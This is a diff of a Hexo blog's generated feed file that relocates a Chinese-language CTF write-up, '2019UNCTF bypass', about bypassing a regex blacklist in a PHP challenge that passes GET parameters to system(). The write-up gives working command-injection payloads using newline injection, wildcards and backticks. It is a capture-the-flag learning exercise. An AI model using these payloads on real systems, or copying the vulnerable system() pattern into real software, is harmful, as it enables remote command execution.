@@ -4,31 +4,6 @@
   
     
     <entry>
-      <title>2019UNCTF bypass</title>
-      <link href="/2019/12/01/2019UNCTF-bypass/"/>
-      <url>/2019/12/01/2019UNCTF-bypass/</url>
-      
-        <content type="html"><![CDATA[<h2 id="rce，正则匹配特点，文件通配符，命令换行，命令注释"><a href="#rce，正则匹配特点，文件通配符，命令换行，命令注释" class="headerlink" title="rce，正则匹配特点，文件通配符，命令换行，命令注释"></a>rce，正则匹配特点，文件通配符，命令换行，命令注释</h2><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">    highlight_file(__FILE__);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">    $a &#x3D; $_GET[&#39;a&#39;];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">    $b &#x3D; $_GET[&#39;b&#39;];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line"> &#x2F;&#x2F; try bypass it</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">    if (preg_match(&quot;&#x2F;\&#39;|\&quot;|,|;|\\|\&#96;|\*|\n|\t|\xA0|\r|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w&#x2F;is&quot;, $a))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">        $a &#x3D; &quot;&quot;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">        $a &#x3D;&#39;&quot;&#39; . $a . &#39;&quot;&#39;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">    if (preg_match(&quot;&#x2F;\&#39;|\&quot;|;|,|\&#96;|\*|\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w&#x2F;is&quot;, $b))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">        $b &#x3D; &quot;&quot;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">        $b &#x3D; &#39;&quot;&#39; . $b . &#39;&quot;&#39;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">     $cmd &#x3D; &quot;file $a $b&quot;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">      str_replace(&quot; &quot;,&quot;&quot;,&quot;$cmd&quot;); </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">     system($cmd);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">?&gt;</span></pre></td></tr></table></figure><h2 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h2><p>正则中有一段<br><br><code>\\|</code><br><br>会将|进行转义，这是因为在preg_match中，三个反斜杠\\才能匹配一个真正意义上的字符反斜杠\，所以这里因为正则的匹配机制造成了反引号逃逸。<br><br>传入a，b后会再前后加上双引号，所以我们可以利用 \ 给a后面的”进行转义，然后让前面的”匹配b前面的,然后利用%0a,来造成命令换行，利用#号来进行命令终结。<br><br>实质上还是因为正则\匹配不到\的问题再结合linux的命令终止符%20#处理双引号.<br><br><b>最终的payload为：</b><br><br><code>?a=\&amp;b=%0a/???/gr?p -r ctf %23     %23=&#39;#&#39;或?a=\&amp;b=%0a/???/gr[d-f]p+-r+.+%23</code><br><br><b>我的思路是因为正则匹配禁用了bin，所以估计实在bin目录下</b></p><h2 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h2><p>这边正则没有过滤 ``反引号间的内容，会被shell先执行。其输出被放入主命令后，主命令再被执行。<br><br>dir列目录<br><br><code>?a=`dir%20/</code><br></p><p><img src="1.jpg" alt=""><br>试试grep查找flag<br><br><code>?a=`/???/gr?p -r ctf</code><br></p><p><img src="2.jpg" alt=""></p>]]></content>
-      
-      
-      <categories>
-          
-          <category> CTF </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> PHP </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>hexo-next搭建配置以及坑点(二)</title>
       <link href="/2019/12/01/hexo-next%E6%90%AD%E5%BB%BA%E9%85%8D%E7%BD%AE%E4%BB%A5%E5%8F%8A%E5%9D%91%E7%82%B9-%E4%BA%8C/"/>
       <url>/2019/12/01/hexo-next%E6%90%AD%E5%BB%BA%E9%85%8D%E7%BD%AE%E4%BB%A5%E5%8F%8A%E5%9D%91%E7%82%B9-%E4%BA%8C/</url>
@@ -71,6 +46,31 @@
         <tags>
             
             <tag> next </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>2019UNCTF bypass</title>
+      <link href="/2019/11/21/2019UNCTF-bypass/"/>
+      <url>/2019/11/21/2019UNCTF-bypass/</url>
+      
+        <content type="html"><![CDATA[<h2 id="rce，正则匹配特点，文件通配符，命令换行，命令注释"><a href="#rce，正则匹配特点，文件通配符，命令换行，命令注释" class="headerlink" title="rce，正则匹配特点，文件通配符，命令换行，命令注释"></a>rce，正则匹配特点，文件通配符，命令换行，命令注释</h2><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">    highlight_file(__FILE__);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">    $a &#x3D; $_GET[&#39;a&#39;];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">    $b &#x3D; $_GET[&#39;b&#39;];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line"> &#x2F;&#x2F; try bypass it</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">    if (preg_match(&quot;&#x2F;\&#39;|\&quot;|,|;|\\|\&#96;|\*|\n|\t|\xA0|\r|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w&#x2F;is&quot;, $a))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">        $a &#x3D; &quot;&quot;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">        $a &#x3D;&#39;&quot;&#39; . $a . &#39;&quot;&#39;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">    if (preg_match(&quot;&#x2F;\&#39;|\&quot;|;|,|\&#96;|\*|\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w&#x2F;is&quot;, $b))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">        $b &#x3D; &quot;&quot;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">        $b &#x3D; &#39;&quot;&#39; . $b . &#39;&quot;&#39;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">     $cmd &#x3D; &quot;file $a $b&quot;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">      str_replace(&quot; &quot;,&quot;&quot;,&quot;$cmd&quot;); </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">     system($cmd);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">?&gt;</span></pre></td></tr></table></figure><h2 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h2><p>正则中有一段<br><br><code>\\|</code><br><br>会将|进行转义，这是因为在preg_match中，三个反斜杠\\才能匹配一个真正意义上的字符反斜杠\，所以这里因为正则的匹配机制造成了反引号逃逸。<br><br>传入a，b后会再前后加上双引号，所以我们可以利用 \ 给a后面的”进行转义，然后让前面的”匹配b前面的,然后利用%0a,来造成命令换行，利用#号来进行命令终结。<br><br>实质上还是因为正则\匹配不到\的问题再结合linux的命令终止符%20#处理双引号.<br><br><b>最终的payload为：</b><br><br><code>?a=\&amp;b=%0a/???/gr?p -r ctf %23     %23=&#39;#&#39;或?a=\&amp;b=%0a/???/gr[d-f]p+-r+.+%23</code><br><br><b>我的思路是因为正则匹配禁用了bin，所以估计实在bin目录下</b></p><h2 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h2><p>这边正则没有过滤 ``反引号间的内容，会被shell先执行。其输出被放入主命令后，主命令再被执行。<br><br>dir列目录<br><br><code>?a=`dir%20/</code><br></p><img src="/2019/11/21/2019UNCTF-bypass/1.jpg" class=""><p>试试grep查找flag<br></p><p><code>?a=`/???/gr?p -r ctf</code><br></p><img src="/2019/11/21/2019UNCTF-bypass/2.jpg" class="">]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> PHP </tag>
             
         </tags>
       
